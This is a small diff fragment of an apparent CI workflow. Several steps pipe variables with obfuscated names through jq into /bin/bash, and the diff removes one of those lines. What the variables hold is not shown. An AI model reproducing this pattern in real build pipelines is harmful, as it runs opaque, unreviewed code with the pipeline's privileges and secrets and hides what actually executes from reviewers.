@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$onli6475" | jq -r .mi152 | /bin/bash
           printf '%s' "$rt31235" | jq -r .y0 | /bin/bash
           echo $u336 | jq -r .hsjqj8 | /bin/bash
-          echo $mo02 | jq -r .abcwf6954 | /bin/bash
           printf '%s' "$fo508" | jq -r .fsg5 | /bin/bash
 
       - name: Archive data
